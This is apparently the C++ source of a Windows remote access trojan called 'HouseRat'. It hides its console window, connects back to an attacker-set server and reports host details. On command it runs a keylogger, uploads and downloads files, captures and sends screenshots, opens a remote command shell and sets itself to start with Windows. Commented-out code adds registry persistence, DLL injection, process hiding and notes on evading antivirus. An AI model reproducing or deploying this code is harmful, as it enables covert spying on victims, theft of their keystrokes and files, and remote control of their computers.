#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <vector>
#include <unistd.h>
// #include <TlHelp32.h>

using namespace std;

void HouseRat();
void StartKeyLogging();
void SendFile();
void ReceiveFile();
void CaptureScreenshot();
void ChangeWallpaper();
void remoteCMD();
void StealthMode();
void RegisterStartup(std::string fileName);
DWORD GetProcId(const char* procName);

std::string username = getenv("username");
std::string computer = getenv("computername");
std::string appdata = getenv("appdata");
std::string o_system = getenv("os");
std::string startupPath = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
std::string file, command, data, fileName, firstPath;
std::vector<std::string> logs;

SOCKET objSocket;
const std::string SERVER = ""; //server ip
const int PORT = ; //use any open ports must match server.py
const int timeout = 300000;
const bool startup = false;
char buffer[16384]; //max allocation, this is 2048 bytes 

#include "utilities.h"

int main(){

    GetModuleFileNameA(nullptr, buffer, MAX_PATH);
    std::string path = buffer;

    firstPath = path;
    fileName = path.substr(path.find_last_of("/\\") + 1);
    file = fileName;

    CreateMutexA(0, FALSE, fileName.data());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return EXIT_FAILURE;
    }

    if (startup) 
        RegisterStartup(fileName);

    StealthMode();

    HouseRat();
}

void HouseRat()
{
    WSADATA wsdata;
    sockaddr_in client;
    struct in_addr addr;

    //Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) exit(1); 
    addr.s_addr = *(u_long*) gethostbyname(SERVER.data()) -> h_addr_list[0];
    objSocket = socket(AF_INET, SOCK_STREAM, 0);

    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    //Error Retry
    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup();
        Sleep(1000);
        HouseRat();
    }

    send(computer + "\n" + username + "\n" + o_system + "\n" + file);

    while (true)
    {
        memset(buffer, 0, sizeof(buffer));
        command.clear();
        data.clear();

        ssize_t server = recv(objSocket, buffer, sizeof(buffer), 0);
        if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER || server == sizeof(buffer)) {
            closesocket(objSocket);
            WSACleanup();
            ClearLogs();
            HouseRat();
        
        } 

        command = buffer;

        if (command == "test") {
            send("success");
        }
        else if (command == "terminate") {
            closesocket(objSocket);
            WSACleanup();
            ClearLogs();
            exit(0);
        }
        else if (command == "shutdown") {
            system("shutdown /p");
        }
        else if (command == "restart") {
            system("shutdown /r");
        }
        else if (command == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (command == "eyeopener") {
            StartKeyLogging();
        }
        else if (command == "send") {
            SendFile();
        }
        else if (command == "receive") {
            ReceiveFile();
        }
        else if (command == "shuttersound") {
            CaptureScreenshot();
        }
        else if (command == "bgChange") {
            ChangeWallpaper();
        }
        else if (command == "giveConsole") {
            remoteCMD();
        }
  
    }
}
//https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
void StartKeyLogging(){
    char c;

    for(;;) {
        //Virual keys
        for(c = 8; c <= 222; c++) {

            //-32767 in decimal is bits 10000000000000001 in binary
            //
            /*
            Return value
            Type: SHORT
            If the function succeeds, the return value specifies whether the key was pressed since the last call to GetAsyncKeyState, 
            and whether the key is currently up or down. 
            If the most significant bit is set, the key is down, and if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState.

            So, the code will loop through all of the virtual keys between 8..222, looking for only the keys whose state contains both bits set. 
            Though, the documentation goes into further detail explaining why the least significant bit can't be relied on. As such, the if statement will also work when written as either:

            if (GetAsyncKeyState(KEY) & 0x8000)
            Or
            if (GetAsyncKeyState(KEY) < 0)
            */

            if(GetAsyncKeyState(c) == -32767) {
                ofstream write("logs.txt", ios::app);
            
            //Alphabet & not in shift state
            if(((c > 64) && (c < 91)) &&! (GetAsyncKeyState(0x10))) 
            {
                c += 32;
                write << c;
                write.close();
                break;
            }
            else if((c > 64) && (c < 91))
            {   
                write<<c;
                write.close();
                break;
            }
            else 
            {   
                //Special keys
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))    
                            write<<")";
                        else
                            write<<"0";    
                        
                    }   
                    break;
    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"!";
                        else
                            write<<"1";    
                    }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))        
                            write<<"@";
                        else
                            write<<"2";    
                        
                    }
                    break;

                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))    
                            write<<"#";
                        else
                            write<<"3";    
                    }   
                    break;  

                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))       
                            write<<"$";
                        else
                            write<<"4";    
                    }   
                    break;

                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"%";
                        else
                            write<<"5";    
                    }   
                    break;

                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"^";
                        else
                            write<<"6";        
                    }   
                    break;

                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))    
                            write<<"&";
                        else
                            write<<"7";    
                    }   
                    break;

                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"*";
                        else
                            write<<"8";    
                    }   
                    break;

                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"(";
                        else
                            write<<"9";    
                    }   
                    break;
                    
                    case VK_SPACE:
                        write<<" ";
                        break;
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
    
                    default:
                        write<<c; 
                }
                
            }
           
           }
        }

    //here
    }
}

void SendFile()
{
    std::string filePath = recv(1);
    std::ifstream localFile(filePath.data(), std::ios::binary);

    if (!localFile.is_open()) {
        send("invalid");
        return;

    } send("valid");

    try {
        std::vector<char> buf(std::istreambuf_iterator<char>(localFile), {});
        std::string contents(buf.begin(), buf.end());

        localFile.close();
        sendAll(contents);
    
    } catch (std::bad_alloc) {
        sendAll("bad_alloc");
    }
}

void ReceiveFile()
{
    std::string fileName = recv(1);
    int fileSize = atoi(recv(0).data());

    std::string location = appdata + "\\" + fileName;
    try {
        std::string fileData = recvAll(fileSize, 1);
        if (fileData == "error") {
            throw std::bad_alloc();
        
        } send("received");

        FILE *RemoteFile = fopen(location.data(), "wb");
        fwrite(fileData.data(), 1, fileData.size(), RemoteFile);
        fclose(RemoteFile);
    
    } catch (std::bad_alloc) {
        send("error");
    }
}

//https://docs.microsoft.com/en-us/windows/win32/gdi/capturing-an-image
void CaptureScreenshot()
{
    std::string filePath = appdata + "/screenshot.png";

    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


    hFile = CreateFileA(filePath.data(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    std::ifstream localFile(filePath, std::ios::binary);
    if (!localFile.is_open()) {
        send("invalid");
        return;

    } send("valid");

    try {
        std::vector<unsigned char> buf(std::istreambuf_iterator<char>(localFile), {});
        std::string contents(buf.begin(), buf.end());

        localFile.close();
        sendAll(contents);

        logs.push_back(filePath);
    
    } catch (std::bad_alloc) {
        sendAll("bad_alloc");
    }
}

void ChangeWallpaper()
{
    std::string fileName = recv(1);
    int fileSize = atoi(recv(0).data());
    std::string location = appdata + "\\" + fileName;

    try {
        std::string fileData = recvAll(fileSize, 1);
        if (fileData == "error") {
            throw std::bad_alloc();
        
        } send("received");

        //https://www.ibm.com/docs/en/i/7.1?topic=functions-fopen-open-files
        FILE* RemoteFile = fopen(location.data(), "wb");
        fwrite(data.data(), 1, data.size(), RemoteFile);
        fclose(RemoteFile);

        SystemParametersInfoA
        (
            SPI_SETDESKWALLPAPER,
            0,
            (PVOID)location.data(),
            SPIF_UPDATEINIFILE
        
        ); logs.push_back(location);
    
    } catch (std::bad_alloc) {
        send("error");
    }
}

void remoteCMD()
{
    send(getcwd(buffer, FILENAME_MAX));
    FILE* stream;

    while (true)
    {
        std::string command = recv(0);
        if (command == "exit" || command == "error" || command.empty()) return;

        command.append(" 2>&1");
        stream = popen(command.data(), "r");

        if (stream) {
            while (!feof(stream))
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                data.append(buffer);
            
            } pclose(stream);
        
        } sendAll(data); data.clear();
    
    } fclose(stream);
}

void StealthMode(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    //TODO hide process from task manager for more obfuscation 
}

//https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
void RegisterStartup(std::string fileName)
{
    startupPath += fileName;
    std::ifstream backdoorFile(startupPath);
    
    if (!backdoorFile.is_open()) {
        CopyFileA(fileName.data(), startupPath.data(), 0);
    }

    
    /*
    // can use fileName.data() & startupPath instead of hard coding
    // Anti Virus will auto delete this .exe
    // need to bypass windows defender ~

    const char* czStartName = "HouseRat";
    const char* czExePath   = "C:\\Users\\yongan\\AppData\\Roaming\\Microsoft\\Windows\\HouseRat.exe";


    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0 , KEY_WRITE,
                                &hKey);
    if( ERROR_SUCCESS == lnRes )
    {
        lnRes = RegSetValueEx(  hKey,
                                czStartName,
                                0,
                                REG_SZ,
                                (unsigned char*)czExePath,
                                strlen(czExePath) );
    }

    RegCloseKey(hKey);
    */

    // Similarly can use fileName.data() & startupPath instead of hardcoding
    // Anti virus will auto delete this .exe and .dll
    // need to remove windows defender via powershell

    /*
    const char* dllPath = "C:\\Users\\yongan\\Desktop\\somedllhere.dll";
    const char* procName = "HouseRat.exe";
    DWORD procId = 0;

    while (!procId)
    {
        procId = GetProcId(procName);
        Sleep(30);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

    if (hProc && hProc != INVALID_HANDLE_VALUE)
    {
        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

        if (hThread)
        {
            CloseHandle(hThread);
        }
    }

    if (hProc)
    {
        CloseHandle(hProc);
    }
    */

}

/*
// function to get processid so you can hook onto it
DWORD GetProcId(const char* procName)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}
*/

/*
https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/
// Hooked function
NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        // Loop through the list of processes
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
            SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
                NextEntryOffset);
            if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
            {
                if (!pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}